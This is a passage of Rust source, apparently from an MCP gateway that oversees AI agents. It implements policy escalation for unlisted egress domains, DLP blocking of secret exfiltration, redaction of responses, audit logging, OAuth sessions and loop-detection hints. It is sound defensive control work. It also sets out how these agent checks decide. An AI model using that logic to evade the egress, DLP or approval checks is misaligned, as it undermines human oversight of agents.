//! Aegis OS MCP Gateway & Kernel Router (`aos-mcp-gateway`)
//!
//! Unifies all Aegis OS subsystems (`aos-policy`, `aos-vfs`, `aos-ipc`, `aos-sandbox`,
//! `aos-egress`, `aos-recorder`) behind a single MCP-compliant interface.
//! Supports both Stdio MCP transport and cross-process disk-synchronized state
//! for multi-agent AGY workflows.

#![recursion_limit = "512"]

use aos_core::{
    claims, A2AArtifact, A2ATaskState, AgentIdentity, AgentSkill, AuditEvent, DiffChangeType,
    ExecSpec, FlightRecorder, IpcBus, IpcEnvelope, IpcKind, IsolationTier, LeaseGrant, LeaseKind,
    MessageDeliveryStatus, OrgSharedStorage, PolicyContext, PolicyDecision, PolicyEngine,
    ResourceLimits, SandboxConfig, SandboxDriver, SandboxInstance, SnapshotMeta,
    TransactionalWorkspace,
};
use aos_egress::{detect_dlp_patterns, redact_dlp_secrets, AegisEgressGateway, SecretVaultEntry};
use aos_ipc::AegisIpcBus;
use aos_memory::MemoryAction;
use aos_policy::AegisPolicyKernel;
use aos_recorder::AegisFlightRecorder;
use aos_sandbox::{MicroVmSandboxDriver, NativeOsSandboxDriver};
use aos_vfs::vault::{OrgVaultManager, VaultStatus};
use aos_vfs::{CoWWorkspace, OrgCasAndKvStore};
use anyhow::{bail, Context};
use base64::Engine as _;
use chrono::Utc;
use hmac::{Hmac, Mac};
use sha2::{Digest, Sha256};
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::collections::{BTreeMap, BTreeSet, HashMap};
use std::path::{Path, PathBuf};
use std::sync::Arc;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::sync::RwLock;
use uuid::Uuid;

pub mod approver;
pub mod mcp_bundle;
pub mod mcp_firewall;
pub mod mcp_http;
pub mod mcp_mcpb;
pub mod mcp_oauth;
pub mod mcp_registry;
pub mod paas;
mod git;
mod github;
mod host_exec;
mod http_daemon;
mod pkg;
mod external_mcp;
mod fs_transfer;
mod plans;
mod tool_dispatch;
mod tool_schema;
pub use host_exec::HostExecBrokerConfig;
pub use http_daemon::DaemonAuth;
pub use tool_schema::{GatewayToolProfile, HUMAN_ONLY_TOOLS, TOOL_ANNOTATIONS};
use git::*;
use github::*;
use host_exec::*;
use http_daemon::MAX_TOOL_LEASE_TTL_SECS;
#[cfg(test)]
use http_daemon::MAX_HTTP_BODY_BYTES;
use pkg::*;
use mcp_bundle::{BundleInstallOptions, McpBundleManager};
use mcp_firewall::{
    sanitize_server_id, McpProxySessionPool, McpServerPolicy, McpToolRiskClass, McpTrustLevel,
    OutboxStatus, UpstreamTransportSpec,
};
use mcp_oauth::{AuthorizeUrlCallback, DevicePromptCallback, RealmUpsertSpec};
use mcp_registry::{
    derive_exact_allowed_hosts, McpRegistryClient, ResolvedInstallTarget,
};
use mcp_firewall::McpFirewallRegistry;
use mcp_oauth::McpOAuthManager;
use paas::PaasControlPlane;
use fs_transfer::*;


pub struct AgentEnvironment {
    pub identity: AgentIdentity,
    pub workspace: Arc<dyn TransactionalWorkspace>,
    pub sandbox: Box<dyn SandboxInstance>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MountedMcpServer {
    pub name: String,
    pub endpoint: String,
    pub scope: String,
    pub mounted_by: String,
}

#[derive(Debug, Clone)]
pub(crate) struct InlineMcpApprovalCreds {
    pub(crate) static_token: Option<String>,
    pub(crate) env_secrets: BTreeMap<String, String>,
    pub(crate) trust_override: Option<McpTrustLevel>,
    pub(crate) expires_at_ms: i64,
    pub(crate) paired_key: Option<String>,
}

#[derive(Debug, Clone)]
pub struct ScopedMcpNotification {
    pub org_id: Option<String>,
    pub agent_id: Option<String>,
    pub payload: Value,
}

impl ScopedMcpNotification {
    pub fn matches_identity(&self, org_id: &str, agent_id: &str) -> bool {
        self.org_id.as_deref().is_none_or(|o| o == org_id)
            && self.agent_id.as_deref().is_none_or(|a| a == agent_id)
    }
}

pub type PostInstallHookFn = Arc<
    dyn Fn(
            String,
            String,
        ) -> std::pin::Pin<Box<dyn std::future::Future<Output = ()> + Send>>
        + Send
        + Sync,
>;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct McpWebOAuthSession {
    pub session_id: String,
    pub org_id: String,
    pub realm_id: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub server_id: Option<String>,
    pub flow: String,
    pub status: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub authorize_url: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub verification_uri: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub user_code: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub error: Option<String>,
    pub created_at_ms: i64,
    pub updated_at_ms: i64,
}

type HotBridgedMcpMap = HashMap<(String, String), BTreeSet<String>>;

pub struct AegisRuntimeKernel {
    pub(crate) runtime_data_root: PathBuf,
    pub policy: Arc<dyn PolicyEngine>,
    pub ipc: Arc<dyn IpcBus>,
    pub org_storage: Arc<dyn OrgSharedStorage>,
    pub egress: Arc<AegisEgressGateway>,
    pub recorder: Arc<dyn FlightRecorder>,
    pub paas: Arc<PaasControlPlane>,
    pub mcp_firewall: Arc<McpFirewallRegistry>,
    pub mcp_proxy_pool: Arc<McpProxySessionPool>,
    pub mcp_oauth: Arc<McpOAuthManager>,
    pub mcp_bundles: Arc<McpBundleManager>,
    pub mcp_registry: Arc<McpRegistryClient>,
    pub vault: Arc<OrgVaultManager>,
    pub(crate) memory_url: Option<String>,
    pub(crate) memory_bridge_token: Option<String>,
    pub(crate) memory_task_secret: Option<String>,
    pub(crate) agents: Arc<RwLock<HashMap<String, Arc<AgentEnvironment>>>>,
    pub(crate) mounted_mcp_servers: Arc<RwLock<Vec<MountedMcpServer>>>,
    pub(crate) hot_bridged_mcp_servers: Arc<RwLock<HotBridgedMcpMap>>,
    pub(crate) pending_mcp_inline_creds: Arc<RwLock<HashMap<String, InlineMcpApprovalCreds>>>,
    pub(crate) mcp_oauth_sessions: Arc<RwLock<HashMap<String, McpWebOAuthSession>>>,
    pub(crate) mcp_post_install_hook: Arc<RwLock<Option<PostInstallHookFn>>>,
    pub(crate) mcp_notifications_tx: tokio::sync::broadcast::Sender<ScopedMcpNotification>,
    pub(crate) allow_agent_local_http: Arc<std::sync::atomic::AtomicBool>,
    pub(crate) active_host_exec_runs: Arc<std::sync::atomic::AtomicUsize>,
    pub(crate) host_exec_config: RwLock<Option<HostExecBrokerConfig>>,
    /// Per-(agent_id, cmd_bucket) failure streak counter for LoopThrash friction detection.
    pub(crate) friction_streaks: RwLock<HashMap<(String, String), u32>>,
}


impl AegisRuntimeKernel {
    pub async fn new(runtime_data_root: impl AsRef<Path>) -> anyhow::Result<Self> {
        let raw_root = runtime_data_root.as_ref().to_path_buf();
        tokio::fs::create_dir_all(&raw_root).await?;
        let root = std::fs::canonicalize(&raw_root).unwrap_or(raw_root);
        let vault = Arc::new(OrgVaultManager::new(&root));
        Self::new_with_vault(&root, vault).await
    }

    pub async fn new_with_vault(
        runtime_data_root: impl AsRef<Path>,
        vault: Arc<OrgVaultManager>,
    ) -> anyhow::Result<Self> {
        let raw_root = runtime_data_root.as_ref().to_path_buf();
        tokio::fs::create_dir_all(&raw_root).await?;
        let root = std::fs::canonicalize(&raw_root).unwrap_or(raw_root);

        let policy = Arc::new(AegisPolicyKernel::with_state_file(Some(
            root.join("policy_state.json"),
        )));
        let ipc = Arc::new(AegisIpcBus::with_state_file(Some(
            root.join("ipc_state.json"),
        )));
        let org_storage = Arc::new(OrgCasAndKvStore::new(root.join("orgs")).await?);
        let audit_path = root.join("audit").join("flight_recorder.jsonl");
        let recorder = Arc::new(AegisFlightRecorder::new(Some(audit_path)));
        let paas = Arc::new(PaasControlPlane::new(&root));
        let mcp_firewall = Arc::new(McpFirewallRegistry::new(
            &root,
            policy.clone(),
            recorder.clone(),
        ));
        let mcp_proxy_pool = Arc::new(McpProxySessionPool::new(mcp_firewall.clone()));
        let mcp_oauth = mcp_firewall.oauth().clone();
        let mcp_bundles = Arc::new(McpBundleManager::new(
            &root,
            mcp_firewall.clone(),
            mcp_oauth.clone(),
        ));
        let mcp_registry = Arc::new(McpRegistryClient::new(&root));

        Ok(Self {
            runtime_data_root: root,
            policy,
            ipc,
            org_storage,
            egress: Arc::new(AegisEgressGateway::new()),
            recorder,
            paas,
            mcp_firewall,
            mcp_proxy_pool,
            mcp_oauth,
            mcp_bundles,
            mcp_registry,
            vault,
            memory_url: std::env::var("AOS_MEMORY_URL")
                .ok()
                .filter(|value| !value.is_empty()),
            memory_bridge_token: std::env::var("AOS_MEMORY_BRIDGE_TOKEN")
                .ok()
                .filter(|value| !value.is_empty()),
            memory_task_secret: std::env::var("AOS_MEMORY_TASK_SECRET")
                .ok()
                .filter(|value| !value.is_empty()),
            agents: Arc::new(RwLock::new(HashMap::new())),
            mounted_mcp_servers: Arc::new(RwLock::new(Vec::new())),
            hot_bridged_mcp_servers: Arc::new(RwLock::new(HashMap::new())),
            pending_mcp_inline_creds: Arc::new(RwLock::new(HashMap::new())),
            mcp_oauth_sessions: Arc::new(RwLock::new(HashMap::new())),
            mcp_post_install_hook: Arc::new(RwLock::new(None)),
            mcp_notifications_tx: tokio::sync::broadcast::channel(64).0,
            allow_agent_local_http: Arc::new(std::sync::atomic::AtomicBool::new(
                crate::mcp_http::local_http_env_enabled(),
            )),
            active_host_exec_runs: Arc::new(std::sync::atomic::AtomicUsize::new(0)),
            host_exec_config: RwLock::new(None),
            friction_streaks: RwLock::new(HashMap::new()),
        })
    }

    pub fn set_allow_agent_local_http(&self, allow: bool) {
        self.allow_agent_local_http
            .store(allow, std::sync::atomic::Ordering::Release);
    }

    /// Location of the local zero-PII friction log for this gateway runtime root.
    pub fn friction_log_path(&self) -> PathBuf {
        aos_core::friction::default_friction_log_path(&self.runtime_data_root)
    }

    /// Persist a single zero-PII [`aos_core::friction::FrictionEvent`] under `runtime_data_root`.
    pub fn record_kernel_friction(
        &self,
        category: aos_core::friction::FrictionCategory,
        cmd_bucket: aos_core::friction::CmdBucket,
        client: Option<&str>,
        exit_code: Option<i32>,
        streak_len: u32,
        recovered: bool,
    ) {
        let ev = aos_core::friction::new_friction_event(
            category,
            cmd_bucket,
            client,
            exit_code,
            streak_len,
            recovered,
        );
        let _ = aos_core::friction::append_friction_event(&self.friction_log_path(), &ev);
    }

    #[allow(clippy::too_many_arguments)]
    async fn update_proc_exec_friction(
        &self,
        agent_id: &str,
        command: &str,
        cmd_args: &[String],
        exit_code: Option<i32>,
        timed_out: bool,
        stdout: &str,
        stderr: &str,
    ) -> Option<(aos_core::friction::FrictionCategory, String, u32)> {
        let bucket = aos_core::friction::classify_cmd_bucket(command, cmd_args);
        let streak_key = (agent_id.to_string(), bucket.as_str().to_string());

        if !timed_out && exit_code == Some(0) {
            let prev = self.friction_streaks.write().await.remove(&streak_key);
            if let Some(prev_streak) = prev {
                if prev_streak >= 2 {
                    self.record_kernel_friction(
                        aos_core::friction::FrictionCategory::LoopThrash,
                        bucket,
                        Some("mcp_gateway"),
                        Some(0),
                        prev_streak,
                        true,
                    );
                }
            }
            return None;
        }

        let streak = {
            let mut streaks = self.friction_streaks.write().await;
            let entry = streaks.entry(streak_key).or_insert(0);
            *entry = entry.saturating_add(1);
            *entry
        };

        if let Some(mut diag) = aos_core::friction::diagnose_proc_exec_friction(
            command, cmd_args, exit_code, timed_out, stdout, stderr,
        ) {
            self.record_kernel_friction(
                diag.category,
                diag.cmd_bucket,
                Some("mcp_gateway"),
                exit_code,
                streak,
                false,
            );
            if streak >= 3 {
                diag.hint.push_str(
                    " [Loop guard: repeated consecutive failures in this category — switch approach or use Aegis MCP tools.]",
                );
            }
            return Some((diag.category, diag.hint, streak));
        }

        if streak >= 3 {
            self.record_kernel_friction(
                aos_core::friction::FrictionCategory::LoopThrash,
                bucket,
                Some("mcp_gateway"),
                exit_code,
                streak,
                false,
            );
            return Some((
                aos_core::friction::FrictionCategory::LoopThrash,
                format!(
                    "Detected {streak} consecutive failing `{}` commands in proc_exec. Pause and fix the root cause (or switch to `egress_http_request`, `pkg_install`, or `$TMPDIR`) rather than retrying blindly.",
                    bucket.as_str()
                ),
                streak,
            ));
        }

        None
    }

    async fn record_tool_streak_failure(
        &self,
        agent_id: &str,
        streak_name: &str,
        category: aos_core::friction::FrictionCategory,
        bucket: aos_core::friction::CmdBucket,
    ) -> u32 {
        let streak_key = (agent_id.to_string(), streak_name.to_string());
        let streak = {
            let mut streaks = self.friction_streaks.write().await;
            let entry = streaks.entry(streak_key).or_insert(0);
            *entry = entry.saturating_add(1);
            *entry
        };
        self.record_kernel_friction(category, bucket, Some("mcp_gateway"), None, streak, false);
        if streak >= 3 {
            self.record_kernel_friction(
                aos_core::friction::FrictionCategory::LoopThrash,
                bucket,
                Some("mcp_gateway"),
                None,
                streak,
                false,
            );
        }
        streak
    }

    async fn reset_tool_streak_on_success(
        &self,
        agent_id: &str,
        streak_name: &str,
        bucket: aos_core::friction::CmdBucket,
    ) {
        let streak_key = (agent_id.to_string(), streak_name.to_string());
        let prev = self.friction_streaks.write().await.remove(&streak_key);
        if let Some(prev_streak) = prev {
            if prev_streak >= 2 {
                self.record_kernel_friction(
                    aos_core::friction::FrictionCategory::LoopThrash,
                    bucket,
                    Some("mcp_gateway"),
                    Some(0),
                    prev_streak,
                    true,
                );
            }
        }
    }

    fn slice_poll_log_bytes(
        bytes: &[u8],
        offset: Option<usize>,
        tail_bytes: usize,
    ) -> (String, usize, bool, usize) {
        let total = bytes.len();
        let (start, end, truncated) = match offset {
            Some(req_off) => {
                let start = req_off.min(total);
                let end = start.saturating_add(tail_bytes).min(total);
                (start, end, end < total)
            }
            None => {
                let start = total.saturating_sub(tail_bytes);
                (start, total, start > 0)
            }
        };
        let text = String::from_utf8_lossy(&bytes[start..end]).into_owned();
        (text, total, truncated, start)
    }

    async fn execute_fs_edit(env: &AgentEnvironment, args: &Value) -> anyhow::Result<Value> {
        let rel_path = args
            .get("path")
            .and_then(|v| v.as_str())
            .context("Missing 'path'")?;
        let target = args
            .get("target")
            .and_then(|v| v.as_str())
            .context("Missing 'target'")?;
        let replacement = args
            .get("replacement")
            .and_then(|v| v.as_str())
            .context("Missing 'replacement'")?;
        let (scope, clean, full_path) = resolve_fs_path_for_write(
            env.workspace.shadow_root(),
            &env.sandbox.config().agent_home_dir,
            rel_path,
        )?;
        let original = tokio::fs::read_to_string(&full_path)
            .await
            .with_context(|| format!("File '{}' not found", clean))?;
        if !original.contains(target) {
            bail!(
                "Target snippet not found in '{}' inside CoW shadow workspace",
                clean
            );
        }
        let updated = original.replace(target, replacement);
        aos_core::session::write_bytes_atomic_synced_async(&full_path, updated.into_bytes()).await?;
        let status = match scope {
            FsScope::Shadow => "edited_in_cow_shadow",
            FsScope::TmpDir => "edited_in_agent_tmp",
        };
        Ok(json!({
            "status": status,
            "path": clean,
            "host_modified": false
        }))
    }

    async fn execute_egress_http_request(
        &self,
        identity: &AgentIdentity,
        args: &Value,
    ) -> anyhow::Result<Value> {
        const MAX_EGRESS_RESPONSE_BYTES: usize = 256 * 1024;
        let raw_url = args
            .get("url")
            .and_then(|v| v.as_str())
            .map(str::trim)
            .filter(|s| !s.is_empty());
        let method = args
            .get("method")
            .and_then(|v| v.as_str())
            .unwrap_or("GET")
            .trim()
            .to_ascii_uppercase();
        if !matches!(
            method.as_str(),
            "GET" | "POST" | "PUT" | "PATCH" | "DELETE" | "HEAD" | "OPTIONS"
        ) {
            bail!("Unsupported HTTP method '{}' in egress_http_request", method);
        }
        let allow_local_http = self
            .allow_agent_local_http
            .load(std::sync::atomic::Ordering::Relaxed);

        let (target_domain, path, parsed_port, parsed_is_https, execute_default) =
            if let Some(u) = raw_url {
                let (is_https, host, port, pq) =
                    crate::mcp_http::parse_validated_url_parts(u, allow_local_http)?;
                (host, pq, Some(port), is_https, true)
            } else {
                let dom = args
                    .get("target_domain")
                    .and_then(|v| v.as_str())
                    .map(str::trim)
                    .filter(|s| !s.is_empty())
                    .context("Missing 'url' or 'target_domain'")?
                    .to_string();
                let raw_path = args
                    .get("path")
                    .and_then(|v| v.as_str())
                    .unwrap_or("/");
                let normalized_path = if raw_path.starts_with('/') {
                    raw_path.to_string()
                } else {
                    format!("/{raw_path}")
                };
                (dom, normalized_path, None, true, false)
            };
        let execute = args
            .get("execute")
            .and_then(|v| v.as_bool())
            .unwrap_or(execute_default);
        let timeout_ms = args
            .get("timeout_ms")
            .and_then(|v| v.as_u64())
            .unwrap_or(15_000)
            .clamp(1_000, 60_000);
        let headers: HashMap<String, String> = args
            .get("headers")
            .and_then(|v| serde_json::from_value(v.clone()).ok())
            .unwrap_or_default();
        let body = args.get("body").and_then(|v| v.as_str());

        let spec = aos_egress::OutboundRequestSpec {
            target_domain: target_domain.clone(),
            method: method.clone(),
            path: path.clone(),
            headers: headers.clone(),
        };
        let verdict = self
            .egress
            .inspect_and_inject_with_body(identity, &spec, body)
            .await?;
        let (injected_headers, injected_path, secrets_injected) = match &verdict {
            aos_egress::EgressVerdict::RequiresEscalation { domain, reason } => {
                let esc_decision = self
                    .authorize_and_audit(
                        identity,
                        "egress_unlisted_domain",
                        &identity.org_id,
                        domain,
                        json!({
                            "target_domain": domain,
                            "method": method,
                            "path": path,
                            "reason": reason,
                            "evidence": {
                                "domain": domain,
                                "method": method,
                                "path": path,
                            }
                        }),
                    )
                    .await?;
                match esc_decision {
                    PolicyDecision::Allow { .. } => (headers, path, Vec::new()),
                    PolicyDecision::Ask {
                        escalation_id,
                        reason: esc_reason,
                        suggested_lease_scope,
                    } => {
                        let mut out = serde_json::to_value(&verdict)?;
                        if let Some(obj) = out.as_object_mut() {
                            obj.insert("status".to_string(), json!("approval_required"));
                            obj.insert("escalation_id".to_string(), json!(escalation_id));
                            obj.insert("reason".to_string(), json!(esc_reason));
                            obj.insert(
                                "suggested_lease_scope".to_string(),
                                json!(suggested_lease_scope),
                            );
                        }
                        return Ok(out);
                    }
                    PolicyDecision::Deny { reason: deny_reason } => {
                        bail!("Policy Denied egress to '{}': {}", domain, deny_reason);
                    }
                }
            }
            aos_egress::EgressVerdict::BlockedSecretExfiltration {
                placeholder,
                unauthorized_domain,
            } => {
                let _ = self
                    .recorder
                    .record(AuditEvent {
                        event_id: format!("evt-{}", &Uuid::new_v4().to_string()[..8]),
                        timestamp_ms: Utc::now().timestamp_millis(),
                        org_id: identity.org_id.clone(),
                        agent_id: identity.agent_id.clone(),
                        action: "egress_dlp_block".to_string(),
                        resource: target_domain.clone(),
                        policy_decision: format!("deny:dlp:{placeholder}"),
                        snapshot_id: None,
                        details: json!({
                            "target_domain": target_domain,
                            "method": method,
                            "path": path,
                            "placeholder": placeholder,
                            "unauthorized_domain": unauthorized_domain,
                        }),
                        task_id: self.active_task_id(identity).await,
                        prev_hash: None,
                        event_hash: None,
                    })
                    .await;
                if execute {
                    bail!(
                        "Blocked potential secret exfiltration ({placeholder}) to unauthorized domain '{unauthorized_domain}'"
                    );
                }
                self.record_kernel_friction(
                    aos_core::friction::FrictionCategory::EgressDenied,
                    aos_core::friction::CmdBucket::Egress,
                    Some("mcp_gateway"),
                    None,
                    1,
                    false,
                );
                return Ok(serde_json::to_value(verdict)?);
            }
            aos_egress::EgressVerdict::AllowedAndSanitized {
                injected_headers,
                injected_path,
                secrets_injected,
            } => (
                injected_headers.clone(),
                injected_path.clone(),
                secrets_injected.clone(),
            ),
        };

        if !execute {
            return Ok(serde_json::to_value(
                aos_egress::EgressVerdict::AllowedAndSanitized {
                    injected_headers,
                    injected_path,
                    secrets_injected,
                },
            )?);
        }

        let mut explicit_content_type: Option<String> = None;
        let mut outbound_headers: Vec<(String, String)> = Vec::new();
        for (k, v) in injected_headers {
            if k.contains(['\r', '\n']) || v.contains(['\r', '\n']) || k.trim().is_empty() {
                bail!("Invalid CR/LF or empty HTTP header name in egress_http_request");
            }
            let kl = k.trim().to_ascii_lowercase();
            if matches!(
                kl.as_str(),
                "host" | "content-length" | "transfer-encoding" | "connection"
            ) {
                continue;
            }
            if kl == "content-type" && body.is_some() {
                explicit_content_type = Some(v);
                continue;
            }
            outbound_headers.push((k, v));
        }

        let inferred_ct = explicit_content_type.unwrap_or_else(|| {
            let b_trimmed = body.unwrap_or("").trim_start();
            if b_trimmed.starts_with('{') || b_trimmed.starts_with('[') {
                "application/json".to_string()
            } else {
                "text/plain; charset=utf-8".to_string()
            }
        });

        let (forward_url, forward_allow_local) = if let Some((override_addr, override_tls)) =
            self.egress.upstream_override(&target_domain).await
        {
            let scheme = if override_tls { "https" } else { "http" };
            (
                format!("{scheme}://{override_addr}{injected_path}"),
                allow_local_http || !override_tls,
            )
        } else {
            let scheme = if parsed_is_https { "https" } else { "http" };
            let port_suffix = match (parsed_is_https, parsed_port) {
                (true, Some(p)) if p != 443 => format!(":{p}"),
                (false, Some(p)) if p != 80 => format!(":{p}"),
                _ => String::new(),
            };
            (
                format!("{scheme}://{target_domain}{port_suffix}{injected_path}"),
                allow_local_http,
            )
        };

        let body_param = body.map(|b| (inferred_ct.as_str(), b.as_bytes()));
        let (status_code, resp_headers, resp_bytes) = crate::mcp_http::simple_http_request(
            &method,
            &forward_url,
            &outbound_headers,
            body_param,
            forward_allow_local,
            timeout_ms,
        )
        .await?;

        let truncated = resp_bytes.len() > MAX_EGRESS_RESPONSE_BYTES;
        let capped = &resp_bytes[..resp_bytes.len().min(MAX_EGRESS_RESPONSE_BYTES)];
        let raw_body = String::from_utf8_lossy(capped);
        let (redacted_body, body_dlp) = aos_egress::redact_dlp_secrets(&raw_body);

        let mut sanitized_headers = serde_json::Map::new();
        for (hk, hv) in resp_headers {
            if matches!(
                hk.to_ascii_lowercase().as_str(),
                "set-cookie" | "authorization" | "proxy-authorization"
            ) {
                continue;
            }
            let (hv_clean, _) = aos_egress::redact_dlp_secrets(&hv);
            sanitized_headers.insert(hk, json!(hv_clean));
        }

        let _ = self
            .recorder
            .record(AuditEvent {
                event_id: format!("evt-{}", &Uuid::new_v4().to_string()[..8]),
                timestamp_ms: Utc::now().timestamp_millis(),
                org_id: identity.org_id.clone(),
                agent_id: identity.agent_id.clone(),
                action: "egress_http_forward".to_string(),
                resource: target_domain.clone(),
                policy_decision: format!("allow:{status_code}"),
                snapshot_id: None,
                details: json!({
                    "target_domain": target_domain,
                    "method": method,
                    "status_code": status_code,
                    "truncated": truncated,
                    "secrets_injected_count": secrets_injected.len(),
                }),
                task_id: self.active_task_id(identity).await,
                prev_hash: None,
                event_hash: None,
            })
            .await;

        Ok(json!({
            "executed": true,
            "status_code": status_code,
            "target_domain": target_domain,
            "path": injected_path,
            "headers": sanitized_headers,
            "body": redacted_body,
            "truncated": truncated,
            "dlp_redacted_types": body_dlp,
            "secrets_injected": secrets_injected
        }))
    }

    pub fn subscribe_mcp_notifications(
        &self,
    ) -> tokio::sync::broadcast::Receiver<ScopedMcpNotification> {
        self.mcp_notifications_tx.subscribe()
    }

    pub fn emit_mcp_notification_scoped(
        &self,
        org_id: Option<&str>,
        agent_id: Option<&str>,
        method: &str,
        params: Option<Value>,
    ) {
        let mut msg = json!({
            "jsonrpc": "2.0",
            "method": method,
        });
        if let Some(p) = params {
            if let Some(obj) = msg.as_object_mut() {
                obj.insert("params".to_string(), p);
            }
        }
        let _ = self.mcp_notifications_tx.send(ScopedMcpNotification {
            org_id: org_id.map(str::to_string),
            agent_id: agent_id.map(str::to_string),
            payload: msg,
        });
    }

    pub fn emit_mcp_notification(&self, method: &str, params: Option<Value>) {
        self.emit_mcp_notification_scoped(None, None, method, params);
    }

    pub async fn get_web_mcp_oauth_session(&self, session_id: &str) -> Option<McpWebOAuthSession> {
        let now_ms = Utc::now().timestamp_millis();
        let mut guard = self.mcp_oauth_sessions.write().await;
        guard.retain(|_, s| now_ms.saturating_sub(s.created_at_ms) <= 900_000);
        guard.get(session_id.trim()).cloned()
    }

    fn redact_outbox_ticket_json(t: &mcp_firewall::McpOutboxTicket) -> Value {
        json!({
            "ticket_id": t.ticket_id,
            "org_id": t.org_id,
            "agent_id": t.agent_id,
            "session_id": t.session_id,
            "server_id": t.server_id,
            "tool_name": t.tool_name,
            "risk_class": t.risk_class,
            "preview_arguments": t.preview_arguments,
            "payload_sha256": t.payload_sha256,
            "tainted": t.taint_snapshot.is_some(),
            "taint_snapshot": t.taint_snapshot,
            "dry_run_only": t.dry_run_only,
            "status": t.status,
            "dispatch_result": t.dispatch_result,
            "dispatch_error": t.dispatch_error,
            "created_at_ms": t.created_at_ms,
            "decided_at_ms": t.decided_at_ms,
            "decided_by": t.decided_by,
        })
    }

    #[allow(clippy::too_many_arguments)]
    pub async fn start_web_mcp_oauth_session(
        self: &Arc<Self>,
        org_id: &str,
        server_id: Option<&str>,
        realm_id: Option<&str>,
        remote_url: Option<&str>,
        issuer_url: Option<&str>,
        client_id: Option<&str>,
        allowed_hosts: Vec<String>,
        scopes: Vec<String>,
        flow_mode: &str,
        allow_local_http: bool,
    ) -> anyhow::Result<McpWebOAuthSession> {
        let srv_opt = if let Some(sid) = server_id.map(str::trim).filter(|s| !s.is_empty()) {
            self.mcp_firewall.get_server(org_id, sid).await
        } else {
            None
        };

        let mut eff_remote_url = remote_url
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .map(str::to_string);
        let mut eff_local = allow_local_http;
        let mut srv_realm: Option<String> = None;
        let resolved_server_id = srv_opt
            .as_ref()
            .map(|s| s.server_id.clone())
            .or_else(|| {
                server_id
                    .map(str::trim)
                    .filter(|s| !s.is_empty())
                    .map(sanitize_server_id)
            });

        if let Some(ref srv) = srv_opt {
            eff_local |= srv.allow_local_http;
            srv_realm = srv.auth_realm.clone();
            match &srv.transport {
                UpstreamTransportSpec::Http { url, .. } => {
                    if eff_remote_url.is_none() {
                        eff_remote_url = Some(url.clone());
                    }
                }
                UpstreamTransportSpec::Stdio { .. } => {
                    bail!(
                        "MCP server '{}' uses stdio transport and does not support OAuth 2.1",
                        srv.server_id
                    );
                }
            }
        }

        let raw_realm = realm_id
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .or(srv_realm.as_deref())
            .or(resolved_server_id.as_deref())
            .context("Missing `server_id` or `realm_id` for OAuth flow")?;
        let clean_realm = mcp_oauth::sanitize_realm_id(raw_realm)?;

        let mut hosts = allowed_hosts;
        if hosts.is_empty() {
            if let Some(ref u) = eff_remote_url {
                hosts.extend(derive_exact_allowed_hosts(u));
            }
            if let Some(iss) = issuer_url.map(str::trim).filter(|s| !s.is_empty()) {
                for h in derive_exact_allowed_hosts(iss) {
                    if !hosts.contains(&h) {
                        hosts.push(h);
                    }
                }
            }
        }

        let clean_issuer = issuer_url
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .map(str::to_string);
        let clean_client = client_id
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .map(str::to_string);

        let existing = self.mcp_oauth.get_realm(org_id, &clean_realm).await;
        if existing.is_none() && eff_remote_url.is_none() && clean_issuer.is_none() {
            bail!(
                "OAuth realm '{}' has no endpoint metadata or remote_url",
                clean_realm
            );
        }

        self.mcp_oauth
            .upsert_realm_config(
                org_id,
                &clean_realm,
                RealmUpsertSpec {
                    allowed_hosts: hosts.clone(),
                    issuer_url: clean_issuer.clone().or_else(|| {
                        existing
                            .as_ref()
                            .and_then(|r| r.issuer_url.clone())
                            .or_else(|| eff_remote_url.clone())
                    }),
                    client_id: clean_client.clone(),
                    scopes: scopes.clone(),
                    allow_local_http: eff_local,
                    ..Default::default()
                },
            )
            .await?;

        let realm = self
            .mcp_oauth
            .get_realm(org_id, &clean_realm)
            .await
            .context("loading updated OAuth realm")?;
        eff_local |= realm.allow_local_http;
        let issuer_hint = clean_issuer
            .or_else(|| realm.issuer_url.clone())
            .or_else(|| eff_remote_url.clone());

        let chosen_flow = match flow_mode.trim().to_ascii_lowercase().as_str() {
            "pkce" => "pkce".to_string(),
            "device" | "device_code" => "device_code".to_string(),
            _ => {
                if realm.authorization_endpoint.is_some() {
                    "pkce".to_string()
                } else if realm.device_authorization_endpoint.is_some() {
                    "device_code".to_string()
                } else if let Some(ref target) = issuer_hint {
                    let meta =
                        McpOAuthManager::discover_oauth_metadata(target, eff_local).await?;
                    if meta.authorization_endpoint.is_some() {
                        "pkce".to_string()
                    } else if meta.device_authorization_endpoint.is_some() {
                        "device_code".to_string()
                    } else {
                        bail!("Discovered OAuth metadata exposes neither authorization_endpoint nor device_authorization_endpoint");
                    }
                } else {
                    bail!("OAuth endpoints missing for realm '{}'", clean_realm);
                }
            }
        };

        let now_ms = Utc::now().timestamp_millis();
        let session_id = format!("oauth-{}", Uuid::new_v4().simple());
        let init_session = McpWebOAuthSession {
            session_id: session_id.clone(),
            org_id: org_id.to_string(),
            realm_id: clean_realm.clone(),
            server_id: resolved_server_id.clone(),
            flow: chosen_flow.clone(),
            status: "starting".to_string(),
            authorize_url: None,
            verification_uri: None,
            user_code: None,
            error: None,
            created_at_ms: now_ms,
            updated_at_ms: now_ms,
        };
        {
            let mut guard = self.mcp_oauth_sessions.write().await;
            guard.retain(|_, s| now_ms.saturating_sub(s.created_at_ms) <= 900_000);
            guard.insert(session_id.clone(), init_session.clone());
        }

        let kernel = Arc::clone(self);
        let sid_task = session_id.clone();
        let org_task = org_id.to_string();
        let realm_task = clean_realm.clone();
        let srv_task = resolved_server_id.clone();

        if chosen_flow == "device_code" {
            let (prompt_tx, prompt_rx) = tokio::sync::oneshot::channel::<(String, String)>();
            let prompt_cb: DevicePromptCallback = Box::new(move |uri, code| {
                let _ = prompt_tx.send((uri.to_string(), code.to_string()));
            });
            tokio::spawn(async move {
                let res = kernel
                    .mcp_oauth
                    .login_device_code(
                        &org_task,
                        &realm_task,
